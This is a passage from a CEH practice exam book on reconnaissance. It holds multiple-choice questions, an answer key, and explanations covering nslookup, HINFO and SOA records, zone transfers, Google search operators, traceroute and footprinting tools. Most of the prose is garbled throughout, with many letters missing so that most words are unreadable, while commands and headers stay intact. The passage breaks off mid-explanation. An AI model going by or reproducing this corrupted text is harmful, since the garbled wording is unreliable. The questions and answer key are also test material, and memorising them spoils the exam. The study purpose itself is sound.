22. Wihi h OSRFamwok, which ool vifis if a usam/pofil xiss i up o 306
diff plafoms?

A. domaify.py

B. mailfy.py

C. sachfy.py

D. usufy.py

23. A collagu s h followig io a Googl sach sig:
intitle:intranet inurl:intranet intext:"finance"

Which of h followig sams is mos coc cocig his amp?

A. Th sach gi will o spod wih ay sul bcaus you cao combi
Googl hacks i o li.

B. Th sach gi will spod wih all pags havig h wod intranet i hi il
ad finance i h URL.

C. Th sach gi will spod wih all pags havig h wod intranet i h il
ad i h URL.

D. Th sach gi will spod wih oly hos pags havig h wod intranet i h
il ad URL ad wih finance i h x.

CEH Certified Ethical Hacker Practice Exams

36

02-ch02.indd 36 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

24. Amada woks as sio scuiy aalys ad ovhas a collagu discussig how h
compay usd o iadvly so popiay ifomaio o hi mai wbsi, bu
sic hy alizd i ad ook i dow back a ya ago, i’s o log a ha o hi
busiss. Wh qusiod o i, h claims sval mohs ago h id adom URLs o
h compay’s wbsi ad foud cofidial ifomaio. Amada visis h sam URLs
bu fids ohig. Wh ca Amada go o s pas vsios ad pags of a wbsi?

A. Sach.com

B. Googl cach

C. Pashash.com

D. Achiv.og

25. Which of h followig is a pimay svic of h U.S. Compu Scuiy Icid
Rspos Tam (CSIRT)?

A. CSIRT povids a icid spos svic o abl a liabl ad usd sigl
poi of coac fo poig compu scuiy icids woldwid.

B. CSIRT povids a compu scuiy suvillac svic o supply h govm
wih impoa illigc ifomaio o idividuals avlig aboad.

C. CSIRT povids a paio sig svic o suppo xcpio poig o
icids woldwid by idividuals ad muliaioal copoaios.

D. CSIRT povids a vulabiliy assssm svic o assis law focm agcis
wih pofilig a idividual’s popy o compay’s ass.

26. You cli’s busiss is hadquad i Japa. Which gioal gisy would b h
bs plac o look fo foopiig ifomaio?

A. APNIC

B. RIPE

C. ASIANIC

D. ARIN

E. LACNIC

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

37

02-ch02.indd 37 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

QUICK ANSWER KEY

1. A 10. B 19. C

2. A 11. B 20. A

3. C 12. B 21. A, B, D, F

4. B 13. C 22. D

5. D 14. B, C 23. D

6. D, E 15. A 24. D

7. A 16. E 25. A

8. C 17. B 26. A

9. E 18. B

CEH Certified Ethical Hacker Practice Exams

38

02-ch02.indd 38 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

ANSWERS

1. You a ampig o fid ou h opaig sysm ad CPU yp of sysms i you A
ag ogaizaio. Th DNS sv you wa o us fo lookup is amd ADNS_
Sv, ad h ag machi you wa h ifomaio o is ATARGET_SYSTEM.
Which of h followig slookup commad sis is h bs choic fo discovig his
ifomaio? (Th oupu of h commads is dacd.)

A.
> server ADNS_SERVER
…
> set type=HINFO
> ATARGET_SYSTEM
…

B.
> server ATARGET_SYSTEM
…
> set type=HINFO
> ADNS_SERVER
…

C.
> server ADNS_SERVER

…
> set ATARGET_SYSTEM
> type=HINFO
…

D.
> server type=HINFO

…
> set ADNS_SERVER
> ATARGET_SYSTEM
…

☑ A. This qusio gs you o wo fos. O gads kowldg o HINFO, ad h
oh is slookup us. Fis, h DNS cod HINFO (p RFC 1035) is a souc
yp ha idifis valus fo CPU yp ad opaig sysm. A you absoluly
quid o iclud a HINFO cod fo ach hos i you wok? No, o a all.
Should you? I’m su h’s som aso, somwh ad somim, ha addig
HINFO maks ss, bu I caily ca’ hik of o. I oh wods, his is a ga
cod yp o mmb fo you xam, bu you chacs of sig i i us i h
al wold ak somwh bw sig lobs o h mu a McDoald’s ad
cachig a lpchau idig a uico hough you backyad.

Nslookup syax is h scod poio of his qusio, ad you’ll dfiily d o
kow i. Th syax fo h ool is faily simpl:
nslookup [-options] {hostname | [-server]}

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

39

02-ch02.indd 39 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

Th commad ca b u as a sigl isac, povidig ifomaio basd o h
opios you choos, o you ca u i i iaciv mod, wh h commad us
as a ool, awaiig ipu fom you. Fo xampl, o a Micosof Widows machi,
if you simply yp nslookup a h pomp, you’ll s a display showig you dfaul
DNS sv ad is associad IP addss. Fom h, slookup sis paily, waiig
fo you o ask whav you wa (as a asid, his is kow as interactive mode).
Typig a qusio mak shows all h opios ad swichs you hav availabl.

☐✗ B, C, ad D a icoc bcaus h syax dos o mach.

2. A p s am mmb sds a -mail o a addss ha sh kows is o valid isid
a ogaizaio. Which of h followig is h bs xplaaio fo why sh ook his
acio?

A. To possibly gah ifomaio abou ial hoss usd i h ogaizaio’s -mail
sysm

B. To sa a dial-of-svic aack

C. To dmi a -mail admiisao’s coac ifomaio

D. To gah ifomaio abou how -mail sysms dal wih ivalidly addssd mssags

☑ A. Th hough pocss bhid his is a lo lik ba gabbig o ay of a hudd
diff focd-o siuaios i hackig: los of ifomaio ca b glad fom
sposs o a o siuaio. A bogus ial addss has h poial o povid
mo ifomaio abou h ial svs usd i h ogaizaio, icludig IP
addsss ad oh pi dails.

☐✗ B is icoc bcaus a bogus -mail dos’ cssaily idica h bgiig of a
DoS aack.

☐✗ C is icoc bcaus h -mail admiisao’s coac ifomaio is o s o
ivalid -mail sposs.

☐✗ D is icoc bcaus h p s would alady kow how sysms dal wih
bogus -mail addsss—wha sh would’ kow is wha svs isid his paicula
ogaizaio cay ou hos sps.

3. Fom h paial -mail had povidd, which of h followig pss h u
oigiao of h -mail mssag?
Return-path: <SOMEONE@anybiz.com>
Delivery-date: Tue, 22 Mar 2022 00:31:13 +0200
Received: from mailexchanger.anotherbiz.com([220.15.10.254])
by mailserver.anotherbiz.com running ExIM with esmtp
id xxxxxx-xxxxxx-xxx; Tue, 22 Mar 2022 01:39:23 +0200
Received: from mailserver.anybiz.com ([158.190.50.254] helo=mailserver.
anybiz.com)
by mailexchanger.anotherbiz.com with esmtp id xxxxxx-xxxxxx-xx
for USERJOE@anotherbiz.com; Tue, 22 Mar 2022 01:39:23 +0200
Received: from SOMEONEComputer [217.88.53.154] (helo=[SOMEONEcomputer])
by mailserver.anybiz.com with esmtpa (Exim x.xx)
(envelope-from <SOMEONE@anybiz.com) id xxxxx-xxxxxx-xxxx

CEH Certified Ethical Hacker Practice Exams

40

02-ch02.indd 40 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

for USERJOE@anotherbiz.com; Mon, 21 Mar 2022 20:36:08 -0100
Message-ID: <xxxxxxxx.xxxxxxxx@anybiz.com>
Date: Mon, 21 Mar 2022 20:36:01 -0100
X-Mailer: Mail Client
From: SOMEONE Name <SOMEONE@anybiz.com>
To: USERJOE Name <USERJOE@anotherbiz.com>
Subject: Something to consider
...

A. 220.15.10.254

B. 158.190.50.254

C. 217.88.53.154

D. Th -mail had dos o show his ifomaio.

☑ C. E-mail hads a packd wih ifomaio showig h i ou h
mssag has ak, ad I ca guaa you’ll s a las o qusio o you
xam abou hm. You’ll mos likly b askd o idify h u oigiao—h
machi (pso) who s h -mail i h fis plac (v hough i h al
wold wih poxis ad whao o hid bhid, i may b impossibl). This is
claly show i li 9: Rcivd: fom SOMEONECompu [217.88.53.154]
(hlo=[SOMEONEcompu]). Bu do’ jus sudy ad ly o ha o scio.
Wach h i k h mssag aks ad mak o of h IPs alog h way.

☐✗ A ad B a icoc bcaus hs IPs do o ps h u oigiao of h
mssag. Thy show -mail svs ha a passig/hadlig h mssag.

☐✗ D is icoc bcaus h -mail had dfiily shows h u oigiao.

4. You a lookig fo pags wih h ms CEH ad V11 i hi il. Which Googl hack
is h appopia o?

A. iul:CEHiul:V11

B. alliil:CEH V11

C. iil:CEHiul:V11

D. alliul:CEH V11

☑ B. Th Googl sach opao alliil sachs fo pags ha coai h sig, o
sigs, you spcify. I also allows fo h combiaio of sigs i h il, so you
ca sach fo mo ha o m wihi h il of a pag.

☐✗ A is icoc bcaus h opao iul looks oly i h URL of h si, o h
pag il. I his xampl, h sach migh big you o a pag lik his: hp://
ayplac.com/apach_Vsio/pdfs.hml.

☐✗ C is icoc bcaus h iul opao is’ lookig i h pag il. Ys, you ca
combi opaos, bu hs wo jus wo’ g his job do.

☐✗ D is icoc bcaus alliul dos o look a pag ils; i’s cocd oly wih
h URL islf. As wih h il sachs, his alliul opao allows you o combi
sach sigs.

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

41

02-ch02.indd 41 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

5. You a o a Cisco ou ad wa o idify h pah a pack avls o a spcific IP.
Which of h followig is h bs commad choic fo his?

A. pig

B. ifcofig

C. ac

D. acou

☑ D. You pobably kw, igh up fo, his was a acou qusio, bu h kick
coms wh dcidig which acou commad o us. Tacou, dpdig o
which sysm you us i o, ca us a vaiy of diff poocols ad chiqus.
Fo xampl, o Widows sysms, acou (usig h commad am tracert) uss
ICMP packs ad h TTL (im o liv) valu o map ou a pah bw oigiao
ad dsiaio. Th fis pack s uss a TTL of 1, o show h fis hop. Th x
pack ss i o 2, ad so o, uil h dsiaio is foud. Each ICMP spos
povids ifomaio o h cu hop (ulss ICMP is big fild). O a Liux
sysm (ad o Cisco dvics), you’d us h commad traceroute, ad UDP would
b usd isad of ICMP.

☐✗ A is icoc bcaus h pig commad simply ss fo cociviy ad o s
if h sysm is “liv.” ICMP Echo Rqus packs a s o h dsiaio, ad
ICMP Echo Rply packs a ud wih ifomaio o h sysm. Of cous,
ICMP is of fild a h hos (o fiwall) lvl, so a gaiv pig spos
dos’ cssaily ma h sysm is dow.

☐✗ B is icoc bcaus h ifcofig commad is usd i Liux sysms o display
ifomaio abou h sysm’s wok ifacs. Ifcofig allows fo cofiguig,
coollig, ad quyig TCP/IP wok ifac paams—fo xampl, sig
h IP addss ad sub mask (mask) o a NIC.

☐✗ C is icoc bcaus h ac commad will wok o a Widows sysm bu o
o a Cisco dvic.

6. Which of h followig aciviis a not cosidd passiv foopiig? (Choos wo.)

A. Dumps divig

B. Rviwig fiacial sis fo compay ifomaio

C. Clickig liks wihi h compay’s public wbsi

D. Callig h compay’s hlp dsk li

E. Employig passiv siffig

☑ D, E. This o may b a lil icky, bu oly bcaus w liv ad wok i h al
wold ad his is a xam qusio. EC-Coucil has sval qusioabl aks o
higs gadig al-wold applicaio ad wha hy say you should mmb
fo you xam, ad his is o of hos xampls. Jus mmb ECC was you o
kow aciv ad passiv foopiig ca b dfid by wo higs: wha you ouch

CEH Certified Ethical Hacker Practice Exams

42

02-ch02.indd 42 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

ad how much discovy isk you pu youslf i. Social giig i ad of islf is
o all passiv o aciv i au. I h cas of dumps divig, i’s also cosidd
passiv (dspi h al-wold isk of discovy ad h acio you hav o ak o
pull i off ) accodig o ECC.

Howv, pick up a pho ad call somo isid h compay o alk o popl
i h pakig lo, ad you’v xposd youslf o discovy ad a ow pacicig
aciv foopiig. As fa as “passiv” siffig gos, siffig is’ a foopiig
acio a all. Th m “passiv siffig” cocs h ac of simply pluggig i ad
wachig wha coms by, wihou ay pack ijcio o oh acio quid o
you pa.

☐✗ A, B, ad C a icoc bcaus hs a all xampls of passiv coaissac.
Oh xampls migh iclud chckig ou DNS cods (DNS is publicly availabl
ad, p ECC, you ca passivly foopi a ogaizaio by usig fly availabl
DNS cods) ad chckig job lisigs fo h compay.

7. Exami h followig commad squc:
C:\> nslookup
Default Server: ns1.anybiz.com
Address: 188.87.99.6
> set type=HINFO
> someserver
Server: resolver.anybiz.com
Address: 188.87.100.5
Someserver.anybiz.com CPU=Intel Quad Chip OS=Linux 2.8

Which of h followig sams bs dscibs h i of h commad squc?

A. Th opao is umaig a sysm amd somsv.

B. Th opao is ampig DNS poisoig.

C. Th opao is ampig a zo asf.

D. Th opao is ampig o fid a am sv.

☑ A. Th HINFO cod yp is o of hos ally ga idas ha was dsigd o
mak lif asi o vyo y ud ou o b a hoibl ida. Dfid i RFC
1035, Hos Ifomaio (HINFO) DNS cods w oigially idd o povid
h yp of compu ad opaig sysm a hos uss (back i h day, you could also
pu higs lik oom umbs ad oh dscipios i h cod). Howv, o avoid
publicly advisig ha ifomaio (fo obvious asos), his cod yp simply is
o usd much aymo. Ad if you fid o o a public-facig machi, i’s a su
sig of icompc o h pa of h sv admiisaos. I his xampl, h
yp is s o HINFO, ad a machi am—somsv—is povidd. Th aack
ca us h ifomaio coaid i h cod as a umaio souc.

☐✗ B is icoc bcaus DNS poisoig is o caid ou his way. I his commad
squc, h opao is askig fo ifomaio, o pushig up fals is o a
am sv.

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

43

02-ch02.indd 43 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

☐✗ C is icoc bcaus his is o how slookup is usd o pfom a zo asf. To
do ha, you would us h set type=any commad ad h ls -d anybiz.com. You’ll
mo ha likly s ha o you xam, oo.

☐✗ D is icoc bcaus chckig fo am svs i h domai would qui h set
type=NS commad.

8. A ogaizaio has a DNS sv locad i h DMZ ad oh DNS svs locad o
h ia. Wha is his implmaio commoly calld?

A. Dyamic DNS

B. DNSSEC

C. Spli DNS

D. Auo DNS

☑ C. Th ida bhid spli DNS is py simpl: ca wo zos fo h sam domai,
wih o jus fo h ial wok, whil h oh is usd by ay xal
woks. Ial hoss a dicd o h ial domai am sv. Spaaig
h domai svs galy sics h foopiig a aack ca pfom fom h
ousid.

☐✗ A is icoc bcaus dyamic DNS dos’ wok his way. I “gula” DNS, a
am is id o a saic IP addss; howv, fo ay umb of asos, a hosd
dvic may d o chag is IP addss of. I dyamic DNS, a svic povid
uss a pogam ha us o h sysm, coacig h DNS svic ach im h IP
addss chags ad subsquly updaig h DNS daabas o flc h chag
i IP addss. Tha way, v hough a domai am’s IP addss chags, uss do’
hav o do ayhig ou of h odiay o coiu svic—h dyamic DNS
svic will su hy’ poid i h igh dicio.

☐✗ B is icoc bcaus Domai Nam Sysm Scuiy Exsios (DNSSEC) is
a sui of IETF spcificaios fo scuig cai kids of ifomaio povidd
by DNS. Da Kamisky mad DNS vulabiliis widly kow back aoud
2010, ad mos svic povids oll his ou o su ha DNS suls a
cypogaphically pocd. I’s dsigd o povid oigi auhicaio of DNS
daa ad daa igiy.

☐✗ D is icoc bcaus h m auto DNS simply dos’ xis. I’s h puly as a
disaco.

9. You a sig up DNS fo you pis. Sv A is boh a wb sv ad a FTP
sv. You wa o advis boh svics fo his machi as am fcs you
cusoms ca us. Which DNS cod yp would you us o accomplish his?

A. NS

B. SOA

CEH Certified Ethical Hacker Practice Exams

44

02-ch02.indd 44 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

C. MX

D. PTR

E. CNAME

☑ E. W all kow—o should kow by ow—ha a hosam ca b mappd o a IP
usig a A cod wihi DNS. CNAME cods povid fo aliass wihi h zo
fo ha am. Fo isac, you sv migh b amd masv1.ma.com. A
sampl DNS zo y o povid HTTP ad FTP accss migh look lik his:
NAME TYPE VALUE
--------------------------------------------------
ftp.matt.com. CNAME mattserver1.matt.com
www.matt.com CNAME mattserver1.matt.com
mattserver1.matt.com. A 202.17.77.5

☐✗ A is icoc bcaus a Nam Sv (NS) cod shows h am svs wihi
you zo. Ths svs a h os ha spod o you cli’s quss fo am
soluio.

☐✗ B is icoc bcaus h Sa of Auhoiy (SOA) y idifis h pimay am
sv fo h zo. Th SOA cod coais h hosam of h sv sposibl fo
all DNS cods wihi h amspac, as wll as h basic popis of h domai.

☐✗ C is icoc bcaus h Mail Exchag (MX) cod idifis h -mail svs
wihi you domai.

☐✗ D is icoc bcaus a Poi (PTR) cod woks h opposi of a A cod. Th
poi maps a IP addss o a hosam ad is gally usd fo vs lookups.

10. A compay has a public-facig wb applicaio. Is ial ia-facig svs a
spaad ad pocd by a fiwall. Which of h followig choics would b hlpful i
pocig agais uwad umaio?

A. Allowig zo asfs o ANY

B. Esuig h a o A cods fo ial hoss o h public-facig am sv

C. Chagig h pfc umb o all MX cods o zo

D. No allowig ay DNS quy o h public-facig am sv

☑ B. If you compay has a public-facig wbsi, i follows ha a am sv
somwh has o asw lookups i od fo you cusoms o fid h si. Tha
am sv, howv, dos o d o povid lookup ifomaio o ial
machis. Of h choics povidd, as silly as i sms o poi ou, suig h a
o A cods (hos usd o map hosams o a IP addss) o h xal am
sv is a good sa.

☐✗ A is icoc bcaus allowig a zo asf o ayo askig fo i is jus plai
dumb. I may o may o hlp a aack uma you ial wok (mayb
you do’ hav ayhig i h o woy abou), bu i’s jus a hodously bad ida.

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

45

02-ch02.indd 45 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

☐✗ C is icoc bcaus chagig h pfc umb o a MX cod dos’ hav
a hig o do wih umaio. Th pfc umb (a low umb mas fis
usd) dmis oly which sv hadls -mail fis.

☐✗ D is icoc bcaus if you cusoms ca’ quy fo h IP associad wih h
hosam, how a hy supposd o fid you wbsi?

11. A hical hack sachs fo IP ags owd by h cli, ads ws aicls, obsvs
wh bak mploys aiv ad lav fom wok, sachs h cli’s job posigs, ad
visis h cli’s dumps. Which of h followig is a u sam?

A. All of h acios a aciv foopiig.

B. All of h acios a passiv foopiig.

C. Th hical hack is i h sysm aack phas.

D. Th hical hack is acig as a black-ha aack.

☑ B. I kow, I kow—I ca ha you pofssioal s aks scamig a m alady:
“Ay asw ha sas wih ‘all’ ca b limiad!” Ad, omally, I’d ag wih
you, bu i’s pcisly why I addd i h. Isofa as you xam is cocd, ach
ad vy xampl i his qusio happs o b a xampl of passiv foopiig.

☐✗ A is icoc bcaus o of hs acios a aciv foopiig. A active
footprinting ffo is o ha quis h aack o ouch h dvic, wok, o
souc, whas passive footprinting fs o masus o collc ifomaio fom
publicly accssibl soucs.

☐✗ C is icoc bcaus h aack is i h coaissac phas.

☐✗ D is icoc bcaus h is o idicaio which “ha” h aack is acig as,
alhough as a hical hack, i should b as a whi ha.

12. Exami h followig SOA cod:
@ IN SOARTDNSRV1.somebiz.com. postmaster.somebiz.com. (
200408097 ; serial number

3600 ; refresh [1h]
600 ; retry [10m]
86400 ; expire [1d]

7200 ) ; min TTL [2h]

If a scoday sv i h pis is uabl o chck i fo a zo upda wihi a
hou, wha happs o h zo copy o h scoday?

A. Th zo copy is dumpd.

B. Th zo copy is uchagd.

C. Th sial umb of h zo copy is dcmd.

D. Th sial umb of h zo copy is icmd.

CEH Certified Ethical Hacker Practice Exams

46

02-ch02.indd 46 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

☑ B. You will dfiily s qusios abou h SOA cod. I his qusio, h ky
poio you’ lookig fo is h TTL (im o liv) valu a h boom, which is
culy wo hous (7200 scods). This ss h im a scoday sv has o
vify is cods a good. If i ca’ chck i, his TTL fo zo cods will xpi,
ad hy’ll all b dumpd. Cosidig, hough, his TTL is s o wo hous ad
h qusio sas i has b oly o hou sic upda, h zo copy o h
scoday will mai uchagd.

☐✗ A is icoc bcaus h scoday is sill wll wihi is widow fo vifyig h
zo copy i holds. I dumps h cods oly wh TTL is xcdd.

☐✗ C is icoc bcaus, fis, sial umbs a v dcmd; hy’ always
icmd. Scod, h sial umb of h zo copy is chagd oly wh a
cocio o h pimay occus ad a copy is updad.

☐✗ D is icoc bcaus, whil sial umbs a icmd o chags (h
scoday copis h umb fom h pimay’s copy wh asfig cods), h
sial umb of h zo copy is chagd oly wh a cocio o h pimay
occus ad a copy is updad. Tha has o occud h.

13. Which poocol ad po umb combiaio is usd by dfaul fo DNS zo asfs?

A. UDP 53

B. UDP 161

C. TCP 53

D. TCP 22

☑ C. TCP 53 is h dfaul poocol ad po umb fo zo asfs. DNS acually
uss boh TCP ad UDP o g is job do, ad if you hik abou wha i’s doig,
hy mak ss i paicula cicumsacs. A am soluio qus ad ply?
Small ad quick, so us po 53 o UDP. A zo asf, which could poially b
lag ad quis som assuac i all gs h? Po 53 o TCP is h asw.

☐✗ A, B, ad D a icoc bcaus hy do o ps h dfaul po ad poocol
combiaio fo a zo asf.

14. Exami h followig commad-li y:
C:\>nslookup

Default Server: ns1.somewhere.com
Address: 128.189.72.5

> set q=mx
>mailhost

Which sams a u gadig his commad squc? (Choos wo.)

A. Nslookup is i oiaciv mod.

B. Nslookup is i iaciv mod.

C. Th oupu will show all mail svs i h zo somwh.com.

D. Th oupu will show all am svs i h zo somwh.com.

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

47

02-ch02.indd 47 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

☑ B, C. Nslookup us i o of wo mods—iaciv ad oiaciv.
Noiaciv mod is simply h us of h commad followd by a oupu. Fo
xampl, nslookup www.google.com will u h IP addss you sv ca fid
fo Googl. Iaciv mod is sad by simply ypig nslookup ad pssig
enter. You dfaul sv am will display, alog wih is IP addss, ad a ca
(>) will awai y of you x commad. I his scaio, w’v d iaciv
mod ad s h yp o MX, which w all kow mas “Plas povid m wih all
h mail xchag svs you kow abou.”

☐✗ A is icoc bcaus w a dfiily i iaciv mod.

☐✗ D is icoc bcaus yp was s o MX, o NS.

15. Jo accsss h compay wbsi, www.aybusi.com, fom his hom compu ad is
psd wih a dfacd si coaiig disubig imags. H calls h IT dpam
o po h wbsi hack ad is old hy do o s ay poblm wih h si—o fils
hav b chagd, ad wh accssd fom hi mials (isid h compay), h
si appas omal. Jo cocs ov VPN io h compay wbsi ad oics h
si appas omal. Which of h followig migh xplai h issu?

A. DNS poisoig

B. Rou poisoig

C. SQL ijcio

D. ARP poisoig

☑ A. DNS poisoig maks h mos ss h. I may cass (such as mi igh
h i my ow wok-fom-hom offic), a VPN cocio back o h compay
focs you o us h compay DNS isad of you local soluio. I his xampl,
Jo’s cocio fom hom uss a diff DNS sv fo lookups ha ha of h
busiss wok. I’s ily possibl somo has chagd h cach is i his
local sv o poi o a diff IP ha h o hosig h al wbsi—o ha
h hacks hav s up o povid h dfacd vsio. Th fac h wb fils hav’
chagd ad h si sms o b displayig jus fi fom isid h wok also
bas his ou. If i us ou Jo’s DNS modificaio is h oly o i plac, h is
a sog liklihood ha Jo is big spcifically agd fo xploiaio—somhig
Jo should ak vy siously. Lasly, h HOSTS ad LMHOSTS fils ca also play
a big ol i his kid of scaio; howv, if a aack alady has ha kid of
accss o Jo’s compu, h has bigg poblms ha h copoa wbsi.

☐✗ B is icoc bcaus ou poisoig has ohig o do wih his. Rou poisoig
is usd i disac vco ouig poocols o pv ou loops i ouig abls.

☐✗ C is icoc bcaus alhough SQL ijcio is, idd, a hackig aack, i’s o
lva h. Th fac ha h wbsi fils mai iac ad uchagd povs ha
accss o h si hough a SQL wakss is’ wha occud h.

CEH Certified Ethical Hacker Practice Exams

48

02-ch02.indd 48 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

☐✗ D is icoc bcaus ARP poisoig is lva isid a paicula sub, o
ousid i (gad, you ca hav ARP fowadd by a ou cofigud o do so, bu
his simply is’ h cas fo his qusio). ARP poisoig will dic a qus fom
o machi o aoh isid h sam sub ad has lil o do wih h scaio
dscibd h. Whil you could mak a chical agum ARP poisoig migh
wok i his scaio, h ky poi was o focus o h xplici wok sgm
DNS sigs. I oh wods, i sms highly ulikly Jo’s hom wok would b
vicimizd by ARP poisoig, ad h fa mo likly asw is his ISP’s DNS has
b poisod.

16. O way o miiga agais DNS poisoig is o sic o limi h amou of im
cods ca say i cach bfo hy’ updad. Which DNS cod yp allows you o
s his sicio?

A. NS

B. PTR

C. MX

D. CNAME

E. SOA

☑ E. Th SOA cod holds all sos of ifomaio, ad wh i coms o DNS
poisoig, h TTL is of pimay is. Th sho h TTL, h lss im cods
a hld i cach. Whil i wo’ pv DNS poisoig alogh, i ca limi h
poblms a succssful cach poisoig aack causs.

☐✗ A is icoc bcaus a NS cod shows h am svs foud i h domai.

☐✗ B is icoc bcaus a PTR cod povids fo vs lookup capabiliy—a
IP-addss-o-hosam mappig.

☐✗ C is icoc bcaus a MX cod shows h mail xchag svs i h zo.

☐✗ D is icoc bcaus a CNAME cod is usd o povid alias is fo you zo
(usually fo mulipl svics o sis o o IP addss).

17. Which of h followig may b a scuiy coc fo a ogaizaio?

A. Th ial wok uss piva IP addsss gisd o a Aciv Dicoy–
igad DNS sv.

B. A xal DNS sv is Aciv Dicoy igad.

C. All xal am soluio quss a accomplishd by a ISP.

D. No of h abov.

☑ B. If you hav a Widows Aciv Dicoy (AD) wok, havig AD-igad
DNS svs offs som ga advaags. Fo xampl (ad dicly fom Micosof,
I migh add), “wih dicoy-igad soag, dyamic updas o DNS a
coducd basd upo a mulimas upda modl. I his modl, ay auhoiaiv

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

49

02-ch02.indd 49 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

DNS sv, such as a domai cooll uig a DNS sv, is dsigad as a
pimay souc fo h zo. Bcaus h mas copy of h zo is maiaid i h
Aciv Dicoy daabas, which is fully plicad o all domai coolls, h zo
ca b updad by h DNS svs opaig a ay domai cooll fo h domai.”
Zos a also plicad ad sychoizd o w domai coolls auomaically
whv a w o is addd o a Aciv Dicoy domai, ad dicoy plicaio
is fas ad mo ffici ha sadad DNS plicaio. Bu havig a Aciv
Dicoy sv facig xally is a hoibl ida.

☐✗ A is icoc bcaus havig AD-igad DNS svs isid you wok, wih
all piva IP addsss, is jus fi. Acually, i’s a py good ida if you hik abou
i fo a bi.

☐✗ C is icoc bcaus havig a xal ISP asw all am soluio quss fo
you public-facig svs is’ a bad ida a all. Ev if h ISP’s DNS is subjc o
aack, ohig is h bu h public-facig hoss ayway.

☐✗ D is icoc bcaus h is a coc asw povidd.

18. Which of h followig is a good foopiig ool fo discovig ifomaio o a publicly
add compay’s foudig, hisoy, ad fiacial saus?

A. SpidFoo

B. EDGAR Daabas

C. Sam Spad

D. Pipl.com

☑ B. Th EDGAR Daabas (hps://www.sc.gov/dga/sach/) holds vaious
compiiv illigc ifomaio o busisss ad is a old favoi of
EC-Coucil. P pvious documaio fom h si, “All compais, foig
ad domsic, a quid o fil gisaio sams, piodic pos, ad
oh foms lcoically hough EDGAR. Ayo ca accss ad dowload his
ifomaio fo f. H you’ll fid liks o a compl lis of filigs availabl
hough EDGAR ad isucios fo sachig h EDGAR daabas.” Fially,
o mo o o EDGAR ad h SEC: Thy hav puviw oly ov publicly
add compais. Pivaly hld compais a o gulad o obligad o pu
ifomaio i EDGAR. Addiioally, v publicly add compais migh o
povid ifomaio abou pivaly owd subsidiais, so b caful ad dilig.

☐✗ A is icoc bcaus SpidFoo is a f, op souc, domai foopiig ool.
Accodig o h si, “i will scap h wbsis o ha domai, as wll as sach
Googl, Ncaf, Whois ad DNS o build up ifomaio.”

☐✗ C is icoc bcaus Sam Spad is a DNS foopiig ool.

☐✗ D is icoc bcaus pipl.com is a si usd fo “popl sach.” Fo foopiig,
pipl.com ca us so-calld “dp wb sachig” fo loads of ifomaio you ca
us. Th followig is fom h si: “Also kow as ‘ivisibl wb,’ h m ‘dp

CEH Certified Ethical Hacker Practice Exams

50

02-ch02.indd 50 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

wb’ fs o a vas posioy of udlyig co, such as docums i oli
daabass ha gal-pupos wb cawls cao ach. Th dp wb co is
simad a 500 ims ha of h sufac wb, y has maid mosly uappd
du o h limiaios of adiioal sach gis.”

19. Wha mhod dos acou us o map ous avld by a pack?

A. By cayig a hllo pack i h payload, focig h hos o spod

B. By usig DNS quis a ach hop

C. By maipulaig h im o liv (TTL) paam

D. By usig ICMP Typ 5, Cod 0 packs

☑ C. Tacou (a las o Widows machis wih h tracert commad) acks a
pack acoss h I by icmig h TTL o ach pack i sds by o
af ach hop is hi ad us, suig h spos coms back xplicily fom
ha hop ad us is am ad IP addss. This povids ou pah ad asi
ims. I accomplishs his by usig ICMP ECHO packs o po ifomaio o
ach “hop” (ou) fom h souc o dsiaio. As a asid, Liux machis us a
sis of UDP packs by dfaul o cay ou h sam fucio i acou.

☐✗ A is icoc bcaus ICMP simply dos’ wok ha way. A hllo pack is gally
usd bw clis ad svs as a chck-i/halh mchaism, o a ou-acig
mhod.

☐✗ B is icoc bcaus a DNS lookup a ach hop is poilss ad dos you o good.
DNS is’ fo ou acig; i’s fo machig hosams ad IP addsss.

☐✗ D is icoc bcaus a ICMP Typ 5, Cod 0 pack is all abou mssag
dicio ad o abou a pig qus (Typ 8).

20. Bad has discovd som PDF fils o a ag’s public-facig wbsi. Which of h
followig ools should h mak us of o xac ay usabl madaa fom hos
docums?

A. Magoofil

B. Shoda

C. Whois

D. Malgo

☑ A. Madaa is all h ifo about a fil ha’s o cssaily vid a fis glac.
Fo xampl, say you ak a ga (bu of cous bluy ad ou of focus) picu
